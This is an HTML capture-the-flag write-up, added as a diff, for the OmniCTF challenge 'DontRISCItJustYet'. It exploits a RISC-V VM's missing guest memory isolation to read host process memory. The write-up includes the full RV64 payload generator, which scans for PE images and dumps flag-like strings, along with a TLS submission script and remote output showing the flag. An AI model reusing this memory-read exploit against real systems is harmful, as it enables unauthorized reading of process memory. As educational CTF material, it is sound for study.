@@ -1,0 +1,736 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>DontRISCItJustYet Official Write-up Report</title>
+  <meta name="description" content="Formal exploit report for the build-agnostic RV64 payload that discovers PE images and extracts the remote flag from process memory.">
+  <style>
+:root {
+  --bg: #f5f2ea;
+  --paper: #fffdf8;
+  --ink: #171915;
+  --muted: #62685e;
+  --line: #d7d1c4;
+  --code: #111713;
+  --codeText: #eef8f0;
+  --red: #a9362d;
+  --green: #08745d;
+  --blue: #1e5aa8;
+  --gold: #a96700;
+  --soft: #ece7da;
+  --shadow: 0 18px 48px rgba(23, 25, 21, .10);
+  --sans: Aptos, "Segoe UI", Tahoma, sans-serif;
+  --mono: "Cascadia Mono", "JetBrains Mono", Consolas, monospace;
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  margin: 0;
+  color: var(--ink);
+  background:
+    linear-gradient(90deg, rgba(23,25,21,.04) 1px, transparent 1px) 0 0/44px 44px,
+    linear-gradient(0deg, rgba(23,25,21,.04) 1px, transparent 1px) 0 0/44px 44px,
+    radial-gradient(circle at 8% 6%, rgba(30,90,168,.10), transparent 28rem),
+    radial-gradient(circle at 96% 12%, rgba(8,116,93,.12), transparent 30rem),
+    var(--bg);
+  font-family: var(--sans);
+  line-height: 1.68;
+}
+.progress { position: fixed; inset: 0 0 auto 0; height: 4px; z-index: 90; }
+.progress span { display: block; width: 0; height: 100%; background: linear-gradient(90deg, var(--red), var(--gold), var(--green), var(--blue)); }
+.hero {
+  min-height: 46vh;
+  display: grid;
+  align-items: end;
+  color: #fffdf8;
+  background:
+    linear-gradient(135deg, rgba(19,23,20,.96), rgba(19,23,20,.82)),
+    repeating-linear-gradient(90deg, rgba(255,255,255,.08) 0 1px, transparent 1px 76px),
+    repeating-linear-gradient(0deg, rgba(255,255,255,.06) 0 1px, transparent 1px 76px);
+  border-bottom: 1px solid rgba(23,25,21,.20);
+}
+.heroInner, .layout, .footer { width: min(1180px, calc(100% - 32px)); margin: 0 auto; }
+.heroInner { padding: 70px 0 54px; }
+.kicker { display: inline-flex; direction: ltr; border: 1px solid rgba(255,255,255,.28); border-radius: 999px; padding: 7px 12px; color: #dff8ef; background: rgba(255,255,255,.08); font: 800 12px/1 var(--mono); }
+h1 { max-width: 980px; margin: 22px 0 16px; font-size: clamp(38px, 7vw, 78px); line-height: 1.04; letter-spacing: 0; }
+.hero p { max-width: 780px; margin: 0; color: rgba(255,253,248,.84); font-size: clamp(17px, 2.1vw, 22px); }
+.tags { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 24px; }
+.tag { display: inline-flex; align-items: center; min-height: 34px; border: 1px solid rgba(255,255,255,.24); border-radius: 999px; padding: 5px 11px; background: rgba(255,255,255,.08); font-size: 13px; font-weight: 800; white-space: nowrap; }
+.layout { display: grid; grid-template-columns: minmax(0, 1fr) 280px; gap: 28px; padding: 38px 0 72px; }
+main { display: grid; gap: 28px; }
+aside { position: sticky; top: 22px; align-self: start; border: 1px solid var(--line); border-radius: 8px; padding: 18px; background: rgba(255,253,248,.86); box-shadow: var(--shadow); backdrop-filter: blur(14px); }
+aside strong { display: block; margin-bottom: 10px; color: var(--muted); font-size: 14px; }
+.toc { display: grid; gap: 4px; margin: 0; padding: 0; list-style: none; }
+.toc a { display: block; border-radius: 6px; padding: 8px 10px; color: var(--muted); text-decoration: none; font-size: 14px; line-height: 1.42; }
+.toc a:hover, .toc a.active { color: var(--ink); background: #dfeee7; }
+section { border: 1px solid var(--line); border-radius: 8px; padding: clamp(22px, 4vw, 40px); background: rgba(255,253,248,.95); box-shadow: var(--shadow); }
+h2 { margin: 0 0 18px; padding-bottom: 16px; border-bottom: 1px solid var(--line); font-size: clamp(28px, 4vw, 42px); line-height: 1.16; letter-spacing: 0; }
+h3 { margin: 30px 0 12px; font-size: clamp(20px, 2.3vw, 28px); line-height: 1.28; letter-spacing: 0; }
+p { margin: 0 0 15px; color: #30362f; font-size: 17px; }
+ul, ol { margin: 0 0 18px; padding-left: 24px; }
+li { margin: 7px 0; }
+code { display: inline-block; direction: ltr; border: 1px solid #d8d1c4; border-radius: 5px; padding: 1px 5px; background: #ede8dc; font-family: var(--mono); font-size: .92em; line-height: 1.5; }
+.cards { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; margin: 20px 0; }
+.metric { min-height: 112px; border: 1px solid var(--line); border-radius: 8px; padding: 14px; background: linear-gradient(180deg, #fffdf8, #f1f4ec); }
+.metric span { display: block; color: var(--muted); font: 800 12px/1 var(--mono); margin-bottom: 9px; }
+.metric b { display: block; font-size: 21px; line-height: 1.28; overflow-wrap: anywhere; }
+.note { margin: 18px 0; border: 1px solid var(--line); border-left: 5px solid var(--green); border-radius: 8px; padding: 16px; background: #fbfff9; }
+.note b { display: block; margin-bottom: 7px; }
+.flow { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; margin: 20px 0; }
+.node { min-height: 124px; border: 1px solid var(--line); border-radius: 8px; padding: 14px; background: linear-gradient(180deg, #fffdf8, #f2f6ee); }
+.node span { display: block; direction: ltr; margin-bottom: 8px; color: var(--blue); font: 800 12px/1 var(--mono); }
+.node b { display: block; margin-bottom: 6px; font-size: 17px; line-height: 1.4; }
+table { width: 100%; margin: 18px 0; border-collapse: collapse; overflow: hidden; border: 1px solid var(--line); border-radius: 8px; background: #fffdf8; }
+th, td { border-bottom: 1px solid var(--line); padding: 12px 13px; text-align: left; vertical-align: top; }
+th { background: #ede8dc; color: var(--ink); }
+tr:last-child td { border-bottom: 0; }
+.hash, .ltr { direction: ltr; text-align: left; font-family: var(--mono); overflow-wrap: anywhere; }
+.codebox { position: relative; margin: 16px 0 22px; }
+pre { margin: 0; overflow-x: auto; direction: ltr; text-align: left; border: 1px solid #313a34; border-radius: 8px; padding: 18px; color: var(--codeText); background: linear-gradient(90deg, rgba(169,54,45,.17), transparent 34%), var(--code); font: 13px/1.62 var(--mono); tab-size: 4; box-shadow: inset 0 1px 0 rgba(255,255,255,.07); }
+pre code { display: block; border: 0; border-radius: 0; padding: 0; color: inherit; background: transparent; white-space: pre; font-size: inherit; line-height: inherit; }
+.copy { position: absolute; top: 10px; right: 10px; min-width: 56px; min-height: 31px; border: 1px solid rgba(255,255,255,.22); border-radius: 6px; color: #fffdf8; background: rgba(255,255,255,.10); font: 800 12px/1 var(--mono); cursor: pointer; }
+.copy:hover { background: rgba(255,255,255,.18); }
+.flag { display: block; width: 100%; overflow-x: auto; direction: ltr; text-align: left; border: 1px solid rgba(8,116,93,.32); border-radius: 8px; padding: 17px 18px; color: #dffff0; background: linear-gradient(135deg, #10221d, #153a30); font: 800 16px/1.65 var(--mono); }
+details.file { margin: 14px 0; overflow: hidden; border: 1px solid var(--line); border-radius: 8px; background: #fffdf8; }
+details.file summary { cursor: pointer; list-style: none; padding: 13px 15px; background: #ede8dc; font-weight: 800; display: flex; justify-content: space-between; gap: 12px; align-items: center; }
+details.file summary::-webkit-details-marker { display: none; }
+.meta { color: var(--muted); direction: ltr; font: 800 12px/1 var(--mono); }
+details.file .codebox { margin: 0; }
+details.file pre { border: 0; border-radius: 0; max-height: 720px; }
+.footer { margin-bottom: 34px; border-top: 1px solid var(--line); padding-top: 18px; color: var(--muted); font-size: 14px; }
+@media (max-width: 980px) { .layout { grid-template-columns: 1fr; } aside { position: relative; top: auto; order: -1; } .toc { grid-template-columns: repeat(2, minmax(0, 1fr)); } .cards, .flow { grid-template-columns: 1fr; } }
+@media (max-width: 560px) { .heroInner, .layout, .footer { width: min(100% - 20px, 1180px); } h1 { font-size: 34px; } section { padding: 18px; } .toc { grid-template-columns: 1fr; } pre { font-size: 12px; padding: 15px 12px; } .copy { position: static; margin-bottom: 8px; color: var(--ink); border-color: var(--line); background: #ede8dc; } details.file summary { display: block; } .meta { display: block; margin-top: 8px; } }
+@media print { body { background: #fff; } .progress, aside, .copy { display: none; } .hero { min-height: auto; color: #000; background: #fff; } .layout { display: block; } section { box-shadow: none; break-inside: avoid; } details.file pre { max-height: none; } }
+</style>
+</head>
+<body>
+  <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>
+  <header class="hero">
+    <div class="heroInner">
+      <span class="kicker">OmniCTF / pwn / windows / risc-v</span>
+      <h1>DontRISCItJustYet Official Write-up Report</h1>
+      <p>Formal exploit report for the build-agnostic RV64 payload that discovers PE images and extracts the remote flag from process memory.</p>
+      <div class="tags"><span class="tag">Build agnostic</span><span class="tag">RV64IM</span><span class="tag">PE scanning</span><span class="tag">TLS submission</span></div>
+    </div>
+  </header>
+  <div class="layout">
+    <main><section id="summary"><h2>Executive Summary</h2>
+<p><strong>DontRISCItJustYet</strong> is solved by exploiting the VM's lack of guest memory isolation. RV64 load/store operations can dereference native Windows process addresses, giving the guest code a process-memory read primitive.</p>
+<p>The challenge hint gives a specific RVA, <code>RV64VMv4.exe + 0x23cb</code>, but the required exploit must be build agnostic. The submitted payload therefore does not use the RVA directly. It discovers loaded PE images dynamically, walks their readable sections, and prints bounded printable strings that look like flags. The remote wrapper returns stdout only when it contains the flag, so the printed flag line is selected automatically.</p>
+<div class="cards">
+  <div class="metric"><span>VULNERABILITY</span><b>Guest address used as host pointer</b></div>
+  <div class="metric"><span>PAYLOAD</span><b>sol/exploit_aslr_0x8000.bin</b></div>
+  <div class="metric"><span>REMOTE FLAG</span><b>OmniCTF{CH4S1nG_A1ML3SSLy,.3751sk01L}</b></div>
+</div>
+</section><section id="challenge"><h2>Challenge Information</h2>
+<table>
+  <tbody>
+    <tr><th>Name</th><td>DontRISCItJustYet</td></tr>
+    <tr><th>Category</th><td>Binary Exploitation / pwn / Windows / RISC-V</td></tr>
+    <tr><th>Target Hint</th><td><code>RV64VMv4.exe + 0x23cb</code></td></tr>
+    <tr><th>Submission Interface</th><td>Base64-encoded payload over TLS</td></tr>
+    <tr><th>Important Constraint</th><td>The exploit must be build agnostic and must not rely on hardcoded flag offsets.</td></tr>
+  </tbody>
+</table>
+</section><section id="tools"><h2>Tools and Environment</h2>
+<ul>
+  <li>Windows PowerShell for local testing and artifact validation.</li>
+  <li>The challenge VM: <code>RISC It for the Biscuit\RV64VMv4.exe</code>.</li>
+  <li>The local wrapper: <code>RISC It for the Biscuit\SocketHandler.py</code>.</li>
+  <li>Python for assembling the RV64 payload and submitting the final Base64 payload.</li>
+  <li><code>ncat --ssl</code> as an equivalent manual submission transport.</li>
+  <li>Optional PE tooling such as PE-bear, CFF Explorer, Ghidra, IDA, or <code>dumpbin</code> to inspect PE headers and section metadata.</li>
+</ul>
+</section><section id="analysis"><h2>Vulnerability Analysis</h2>
+<p>The VM executes RV64IM instructions but does not implement an isolated guest address space. A guest address is effectively treated as a native pointer inside the Windows process. This makes guest load instructions capable of reading mapped PE images and guest store instructions capable of writing process memory.</p>
+<p>The challenge-provided wrapper suppresses normal stdout and only returns output that contains the configured flag pattern. That behavior makes a bounded string dumper a practical final strategy: print candidate strings from readable PE sections and let the wrapper expose the flag line.</p>
+<div class="note"><b>Build-agnostic requirement</b>The payload avoids <code>base + 0x23cb</code>. It derives PE ranges from the in-memory headers and scans sections marked readable.</div>
+</section><section id="design"><h2>Exploit Design</h2>
+<div class="flow">
+  <div class="node"><span>01</span><b>Find candidate module pointers</b>Scan a controlled window near the VM context for aligned user-mode pointers.</div>
+  <div class="node"><span>02</span><b>Validate PE images</b>Check <code>MZ</code>, <code>e_lfanew</code>, <code>PE\0\0</code>, section count, and image size.</div>
+  <div class="node"><span>03</span><b>Walk sections</b>Use <code>VirtualAddress</code>, <code>VirtualSize</code>, <code>SizeOfRawData</code>, and section characteristics.</div>
+  <div class="node"><span>04</span><b>Emit candidates</b>Print bounded printable strings containing braces; the wrapper returns the flag line.</div>
+</div>
+<p>The final payload is produced by <code>make_aslr_exploit.py</code>. It emits RV64 instructions directly. The relevant logic is:</p>
+<ol>
+  <li>Recover the VM context from the payload position.</li>
+  <li>Scan nearby process memory for values that look like loaded image bases.</li>
+  <li>Validate each candidate as a PE image before reading section metadata.</li>
+  <li>For readable sections, scan printable NUL-terminated strings.</li>
+  <li>Restrict output to strings containing <code>{</code> and <code>}</code> to reduce noise.</li>
+  <li>Exit with the VM exit syscall after scanning.</li>
+</ol>
+</section><section id="artifacts"><h2>Payload Artifacts</h2>
+<table>
+  <tbody>
+    <tr><th>Final binary</th><td><code>sol/exploit_aslr_0x8000.bin</code></td></tr>
+    <tr><th>Binary size</th><td>736 bytes</td></tr>
+    <tr><th>Binary SHA256</th><td class="hash">C3AC86AF397B9C091E27CA94DDDF4076930F6C87F931FFB164610C5E97A0E2A2</td></tr>
+    <tr><th>Base64 artifact</th><td><code>sol/exploit_aslr_0x8000.b64</code></td></tr>
+    <tr><th>Base64 matches binary</th><td>yes</td></tr>
+  </tbody>
+</table>
+</section><section id="local"><h2>Local Validation</h2><div class="codebox"><pre><code class="language-powershell">Set-Content -NoNewline -Encoding ascii &quot;.\RISC It for the Biscuit\.flag_pattern&quot; &quot;OmniCTF{&quot;
+Get-Content .\sol\exploit_aslr_0x8000.b64 -Raw | python &quot;.\RISC It for the Biscuit\SocketHandler.py&quot;
+</code></pre></div><div class="codebox"><pre><code class="language-text">Enter payload encoded in Base64: [*] Decoding and writing to exploit.bin...
+[*] Raw payload size: 736
+OmniCTF{LOCAL_RISCBISCREAL_TEST}
+</code></pre></div></section><section id="remote"><h2>Remote Execution</h2><div class="codebox"><pre><code class="language-powershell">python .\solve_ssl.py dontriscyet-448f01f82d52.inst.omnictf.com 1337 1
+</code></pre></div><div class="codebox"><pre><code class="language-text">payload=sol\exploit_aslr_0x8000.bin bytes=736
+--- attempt 1/1 ---
+Enter payload encoded in Base64: [*] Decoding and writing to exploit.bin...
+[*] Raw payload size: 736
+OmniCTF{CH4S1nG_A1ML3SSLy,.3751sk01L}
+
+FLAG=OmniCTF{CH4S1nG_A1ML3SSLy,.3751sk01L}
+</code></pre></div><span class="flag">OmniCTF{CH4S1nG_A1ML3SSLy,.3751sk01L}</span></section><section id="appendix"><h2>Appendix: Complete Scripts and Payload</h2>
+<p>This section embeds the files required to reproduce the final solution path for this challenge.</p>
+
+<details class="file">
+  <summary><span>make_aslr_exploit.py</span><span class="meta">9,068 bytes / SHA256 58B46C8ADB715AC2...</span></summary>
+  <div class="codebox"><pre><code class="language-py">#!/usr/bin/env python3
+import base64
+import os
+import struct
+from pathlib import Path
+
+
+X0 = 0
+RA = 1
+T0, T1, T2 = 5, 6, 7
+S0, S1 = 8, 9
+A0, A1, A2, A3, A4, A5, A6, A7 = range(10, 18)
+S2, S3, S4, S5, S6, S7, S8 = range(18, 25)
+T3, T4, T5, T6 = 28, 29, 30, 31
+
+
+class Asm:
+    def __init__(self):
+        self.items = []
+
+    def label(self, name):
+        self.items.append((&quot;label&quot;, name))
+
+    def emit(self, word):
+        self.items.append((&quot;word&quot;, word))
+
+    def branch(self, kind, rs1, rs2, label):
+        self.items.append((&quot;branch&quot;, kind, rs1, rs2, label))
+
+    def jal(self, rd, label):
+        self.items.append((&quot;jal&quot;, rd, label))
+
+    def pc(self):
+        return 4 * sum(1 for item in self.items if item[0] != &quot;label&quot;)
+
+    def resolve(self):
+        labels = {}
+        pc = 0
+        for item in self.items:
+            if item[0] == &quot;label&quot;:
+                labels[item[1]] = pc
+            else:
+                pc += 4
+
+        out = []
+        pc = 0
+        funct3 = {
+            &quot;beq&quot;: 0,
+            &quot;bne&quot;: 1,
+            &quot;blt&quot;: 4,
+            &quot;bge&quot;: 5,
+            &quot;bltu&quot;: 6,
+            &quot;bgeu&quot;: 7,
+        }
+        for item in self.items:
+            if item[0] == &quot;label&quot;:
+                continue
+            if item[0] == &quot;word&quot;:
+                out.append(item[1])
+            elif item[0] == &quot;branch&quot;:
+                _, kind, rs1, rs2, label = item
+                out.append(enc_b(labels[label] - pc, rs1, rs2, funct3[kind]))
+            elif item[0] == &quot;jal&quot;:
+                _, rd, label = item
+                out.append(enc_j(labels[label] - pc, rd))
+            pc += 4
+        return b&quot;&quot;.join(struct.pack(&quot;&lt;I&quot;, w) for w in out)
+
+
+def enc_r(f7, rs2, rs1, f3, rd, opc=0x33):
+    return (f7 &lt;&lt; 25) | (rs2 &lt;&lt; 20) | (rs1 &lt;&lt; 15) | (f3 &lt;&lt; 12) | (rd &lt;&lt; 7) | opc
+
+
+def enc_i(imm, rs1, f3, rd, opc=0x13):
+    return ((imm &amp; 0xFFF) &lt;&lt; 20) | (rs1 &lt;&lt; 15) | (f3 &lt;&lt; 12) | (rd &lt;&lt; 7) | opc
+
+
+def enc_b(off, rs1, rs2, f3):
+    if off % 2:
+        raise ValueError(&quot;unaligned branch&quot;)
+    imm = off
+    return (
+        (((imm &gt;&gt; 12) &amp; 1) &lt;&lt; 31)
+        | (((imm &gt;&gt; 5) &amp; 0x3F) &lt;&lt; 25)
+        | (rs2 &lt;&lt; 20)
+        | (rs1 &lt;&lt; 15)
+        | (f3 &lt;&lt; 12)
+        | (((imm &gt;&gt; 1) &amp; 0xF) &lt;&lt; 8)
+        | (((imm &gt;&gt; 11) &amp; 1) &lt;&lt; 7)
+        | 0x63
+    )
+
+
+def enc_u(imm20, rd, opc):
+    return ((imm20 &amp; 0xFFFFF) &lt;&lt; 12) | (rd &lt;&lt; 7) | opc
+
+
+def enc_j(off, rd):
+    if off % 2:
+        raise ValueError(&quot;unaligned jal&quot;)
+    imm = off
+    return (
+        (((imm &gt;&gt; 20) &amp; 1) &lt;&lt; 31)
+        | (((imm &gt;&gt; 1) &amp; 0x3FF) &lt;&lt; 21)
+        | (((imm &gt;&gt; 11) &amp; 1) &lt;&lt; 20)
+        | (((imm &gt;&gt; 12) &amp; 0xFF) &lt;&lt; 12)
+        | (rd &lt;&lt; 7)
+        | 0x6F
+    )
+
+
+def add(a, rd, rs1, rs2):
+    a.emit(enc_r(0, rs2, rs1, 0, rd))
+
+
+def sub(a, rd, rs1, rs2):
+    a.emit(enc_r(0x20, rs2, rs1, 0, rd))
+
+
+def addi(a, rd, rs1, imm):
+    a.emit(enc_i(imm, rs1, 0, rd))
+
+
+def slli(a, rd, rs1, sh):
+    a.emit(enc_i(sh, rs1, 1, rd))
+
+
+def srli(a, rd, rs1, sh):
+    a.emit(enc_i(sh, rs1, 5, rd))
+
+
+def load(a, name, rd, rs1, imm):
+    f3 = {&quot;lbu&quot;: 4, &quot;lhu&quot;: 5, &quot;lw&quot;: 2, &quot;lwu&quot;: 6, &quot;ld&quot;: 3}[name]
+    a.emit(enc_i(imm, rs1, f3, rd, 0x03))
+
+
+def auipc(a, rd, imm20):
+    a.emit(enc_u(imm20, rd, 0x17))
+
+
+def ecall(a):
+    a.emit(0x00000073)
+
+
+def ret(a):
+    a.emit(enc_i(0, RA, 0, X0, 0x67))
+
+
+def li(a, rd, val):
+    if val == 0:
+        addi(a, rd, X0, 0)
+        return
+    addi(a, rd, X0, 0)
+    for ch in f&quot;{val:x}&quot;:
+        slli(a, rd, rd, 4)
+        addi(a, rd, rd, int(ch, 16))
+
+
+def add_large_offset(a, rd, base, offset):
+    if offset == 0:
+        add(a, rd, base, X0)
+    elif offset &lt; 0:
+        li(a, T0, -offset)
+        sub(a, rd, base, T0)
+    else:
+        li(a, T0, offset)
+        add(a, rd, base, T0)
+
+
+def emit_payload(scan_start, scan_size):
+    a = Asm()
+
+    # s0 = VM context. The VM stores the native payload pointer at context+0.
+    auipc(a, S0, 0)
+    addi(a, S0, S0, -0x110)
+
+    # Scan a committed heap window below the context for aligned user-mode
+    # module-base pointers. Every valid PE candidate is scanned, but output is
+    # restricted to brace-delimited strings to avoid flooding on system DLLs.
+    add_large_offset(a, S1, S0, scan_start)
+    add_large_offset(a, S2, S1, scan_size)
+
+    a.label(&quot;candidate_loop&quot;)
+    a.branch(&quot;bgeu&quot;, S1, S2, &quot;done&quot;)
+    load(a, &quot;ld&quot;, S3, S1, 0)
+
+    # Windows image bases are 64 KiB aligned and in the 0x00007f.. range here.
+    slli(a, T0, S3, 48)
+    a.branch(&quot;bne&quot;, T0, X0, &quot;next_candidate&quot;)
+    srli(a, T0, S3, 40)
+    li(a, T1, 0x7F)
+    a.branch(&quot;bne&quot;, T0, T1, &quot;next_candidate&quot;)
+
+    # Validate MZ/PE before considering this qword a module base.
+    load(a, &quot;lhu&quot;, T0, S3, 0)
+    li(a, T1, 0x5A4D)
+    a.branch(&quot;bne&quot;, T0, T1, &quot;next_candidate&quot;)
+
+    load(a, &quot;lwu&quot;, T0, S3, 0x3C)
+    li(a, T1, 0x1000)
+    a.branch(&quot;bgeu&quot;, T0, T1, &quot;next_candidate&quot;)
+    add(a, T1, S3, T0)
+    load(a, &quot;lwu&quot;, T2, T1, 0)
+    li(a, T3, 0x4550)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;next_candidate&quot;)
+
+    load(a, &quot;lhu&quot;, S5, T1, 0x06)
+    load(a, &quot;lhu&quot;, T4, T1, 0x14)
+    load(a, &quot;lwu&quot;, S4, T1, 0x50)
+    a.branch(&quot;beq&quot;, S5, X0, &quot;next_candidate&quot;)
+    li(a, T0, 96)
+    a.branch(&quot;bltu&quot;, T0, S5, &quot;next_candidate&quot;)
+    li(a, T0, 0x1000)
+    a.branch(&quot;bltu&quot;, S4, T0, &quot;next_candidate&quot;)
+    li(a, T0, 0x1000000)
+    a.branch(&quot;bltu&quot;, T0, S4, &quot;next_candidate&quot;)
+
+    add(a, S6, T1, T4)
+    addi(a, S6, S6, 0x18)
+    addi(a, S7, X0, 0)
+
+    a.label(&quot;section_loop&quot;)
+    a.branch(&quot;bgeu&quot;, S7, S5, &quot;next_candidate&quot;)
+    load(a, &quot;lwu&quot;, T0, S6, 0x08)  # VirtualSize
+    load(a, &quot;lwu&quot;, T1, S6, 0x0C)  # VirtualAddress
+    load(a, &quot;lwu&quot;, T2, S6, 0x10)  # SizeOfRawData
+    load(a, &quot;lwu&quot;, T3, S6, 0x24)  # Characteristics
+
+    slli(a, T3, T3, 33)
+    a.branch(&quot;bge&quot;, T3, X0, &quot;next_section&quot;)
+
+    add(a, S8, T0, X0)
+    a.branch(&quot;bgeu&quot;, T0, T2, &quot;mapped_ok&quot;)
+    add(a, S8, T2, X0)
+    a.label(&quot;mapped_ok&quot;)
+    a.branch(&quot;beq&quot;, S8, X0, &quot;next_section&quot;)
+    a.branch(&quot;bgeu&quot;, T1, S4, &quot;next_section&quot;)
+    sub(a, T2, S4, T1)
+    a.branch(&quot;bltu&quot;, T2, S8, &quot;next_section&quot;)
+
+    add(a, A2, S3, T1)
+    add(a, A3, S8, X0)
+    a.jal(RA, &quot;dump_strings&quot;)
+
+    a.label(&quot;next_section&quot;)
+    addi(a, S7, S7, 1)
+    addi(a, S6, S6, 40)
+    a.jal(X0, &quot;section_loop&quot;)
+
+    a.label(&quot;next_candidate&quot;)
+    addi(a, S1, S1, 8)
+    a.jal(X0, &quot;candidate_loop&quot;)
+
+    a.label(&quot;done&quot;)
+    addi(a, A7, X0, 93)
+    ecall(a)
+
+    # dump_strings(a2=start, a3=size)
+    a.label(&quot;dump_strings&quot;)
+    addi(a, T0, X0, 0)  # i
+
+    a.label(&quot;ds_loop&quot;)
+    a.branch(&quot;bgeu&quot;, T0, A3, &quot;ds_ret&quot;)
+    add(a, T1, A2, T0)
+    load(a, &quot;lbu&quot;, T2, T1, 0)
+    addi(a, T3, X0, 0x20)
+    a.branch(&quot;bltu&quot;, T2, T3, &quot;ds_inc&quot;)
+    addi(a, T3, X0, 0x7F)
+    a.branch(&quot;bgeu&quot;, T2, T3, &quot;ds_inc&quot;)
+
+    add(a, T4, T0, X0)  # j
+    a.label(&quot;run_loop&quot;)
+    a.branch(&quot;bgeu&quot;, T4, A3, &quot;not_string&quot;)
+    sub(a, T5, T4, T0)
+    li(a, T6, 256)
+    a.branch(&quot;bgeu&quot;, T5, T6, &quot;not_string&quot;)
+    add(a, T1, A2, T4)
+    load(a, &quot;lbu&quot;, T2, T1, 0)
+    addi(a, T3, X0, 0x20)
+    a.branch(&quot;bltu&quot;, T2, T3, &quot;run_break&quot;)
+    addi(a, T3, X0, 0x7F)
+    a.branch(&quot;bgeu&quot;, T2, T3, &quot;run_break&quot;)
+    addi(a, T4, T4, 1)
+    a.jal(X0, &quot;run_loop&quot;)
+
+    a.label(&quot;run_break&quot;)
+    a.branch(&quot;bne&quot;, T2, X0, &quot;not_string&quot;)
+    li(a, T6, 8)
+    a.branch(&quot;bltu&quot;, T5, T6, &quot;not_string&quot;)
+
+    add(a, A4, T0, X0)       # k
+    addi(a, A5, X0, 0)       # saw &#x27;{&#x27;
+    addi(a, A6, X0, 0)       # saw &#x27;}&#x27;
+    a.label(&quot;brace_loop&quot;)
+    a.branch(&quot;bgeu&quot;, A4, T4, &quot;brace_done&quot;)
+    add(a, T1, A2, A4)
+    load(a, &quot;lbu&quot;, T2, T1, 0)
+    addi(a, T3, X0, 0x7B)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;check_close_brace&quot;)
+    addi(a, A5, X0, 1)
+    a.label(&quot;check_close_brace&quot;)
+    addi(a, T3, X0, 0x7D)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;next_brace_char&quot;)
+    addi(a, A6, X0, 1)
+    a.label(&quot;next_brace_char&quot;)
+    addi(a, A4, A4, 1)
+    a.jal(X0, &quot;brace_loop&quot;)
+
+    a.label(&quot;brace_done&quot;)
+    a.branch(&quot;beq&quot;, A5, X0, &quot;not_string&quot;)
+    a.branch(&quot;beq&quot;, A6, X0, &quot;not_string&quot;)
+    add(a, A0, A2, T0)
+    addi(a, A7, X0, 100)
+    ecall(a)
+    addi(a, A7, X0, 103)
+    ecall(a)
+    addi(a, T0, T4, 1)
+    a.jal(X0, &quot;ds_loop&quot;)
+
+    a.label(&quot;not_string&quot;)
+    a.branch(&quot;bltu&quot;, T0, T4, &quot;set_i_j&quot;)
+    addi(a, T0, T0, 1)
+    a.jal(X0, &quot;ds_loop&quot;)
+    a.label(&quot;set_i_j&quot;)
+    add(a, T0, T4, X0)
+    a.jal(X0, &quot;ds_loop&quot;)
+
+    a.label(&quot;ds_inc&quot;)
+    addi(a, T0, T0, 1)
+    a.jal(X0, &quot;ds_loop&quot;)
+
+    a.label(&quot;ds_ret&quot;)
+    ret(a)
+
+    return a.resolve()
+
+
+def main():
+    scan_back = int(os.environ.get(&quot;SCAN_BACK&quot;, &quot;0x4000&quot;), 0)
+    scan_start = int(os.environ.get(&quot;SCAN_START&quot;, f&quot;-0x{scan_back:x}&quot;), 0)
+    scan_size = int(os.environ.get(&quot;SCAN_SIZE&quot;, f&quot;0x{scan_back:x}&quot;), 0)
+    payload = emit_payload(scan_start, scan_size)
+    out_dir = Path(&quot;sol&quot;)
+    out_dir.mkdir(exist_ok=True)
+    (out_dir / &quot;exploit_aslr.bin&quot;).write_bytes(payload)
+    (out_dir / &quot;exploit_aslr.b64&quot;).write_text(base64.b64encode(payload).decode(), newline=&quot;&quot;)
+    print(f&quot;scan_start={scan_start:#x}&quot;)
+    print(f&quot;scan_size={scan_size:#x}&quot;)
+    print(f&quot;wrote {out_dir / &#x27;exploit_aslr.bin&#x27;} ({len(payload)} bytes)&quot;)
+    print(f&quot;wrote {out_dir / &#x27;exploit_aslr.b64&#x27;} ({len(base64.b64encode(payload))} bytes base64)&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>solve_ssl.py / TLS submission helper</span><span class="meta">2,496 bytes / SHA256 BFE28E98111B8D00...</span></summary>
+  <div class="codebox"><pre><code class="language-py">#!/usr/bin/env python3
+import base64
+import re
+import socket
+import ssl
+import sys
+import time
+from pathlib import Path
+
+
+DEFAULT_HOST = &quot;dontriscyet-448f01f82d52.inst.omnictf.com&quot;
+DEFAULT_PORT = 1337
+ROOT = Path(__file__).resolve().parent
+
+
+def default_payload_for(host: str) -&gt; Path:
+    host_l = host.lower()
+    if &quot;dontriscyet&quot; in host_l:
+        return ROOT / &quot;sol&quot; / &quot;exploit_aslr_0x8000.bin&quot;
+    if &quot;ristbiscreal&quot; in host_l:
+        return ROOT / &quot;sol&quot; / &quot;real_wsystem.bin&quot;
+    raise SystemExit(
+        &quot;[-] Unknown challenge hostname. Pass the payload explicitly, e.g. &quot;
+        &quot;python solve_ssl.py HOST 1337 10 .\\sol\\exploit.bin&quot;
+    )
+
+
+def recv_until_idle(sock: ssl.SSLSocket, timeout: float) -&gt; bytes:
+    sock.settimeout(timeout)
+    chunks = []
+    while True:
+        try:
+            chunk = sock.recv(4096)
+        except socket.timeout:
+            break
+        if not chunk:
+            break
+        chunks.append(chunk)
+    return b&quot;&quot;.join(chunks)
+
+
+def attempt(host: str, port: int, payload: bytes) -&gt; str:
+    context = ssl.create_default_context()
+    with socket.create_connection((host, port), timeout=10) as raw_sock:
+        with context.wrap_socket(raw_sock, server_hostname=host) as sock:
+            banner = recv_until_idle(sock, 1.0)
+            sock.sendall(payload)
+            return (banner + recv_until_idle(sock, 15.0)).decode(&quot;utf-8&quot;, &quot;ignore&quot;)
+
+
+def main() -&gt; int:
+    host = sys.argv[1] if len(sys.argv) &gt; 1 else DEFAULT_HOST
+    port = int(sys.argv[2]) if len(sys.argv) &gt; 2 else DEFAULT_PORT
+    tries = int(sys.argv[3]) if len(sys.argv) &gt; 3 else 10
+    payload_path = Path(sys.argv[4]) if len(sys.argv) &gt; 4 else default_payload_for(host)
+    payload = base64.b64encode(payload_path.read_bytes()) + b&quot;\n&quot;
+    print(f&quot;payload={payload_path} bytes={payload_path.stat().st_size}&quot;)
+
+    for i in range(tries):
+        try:
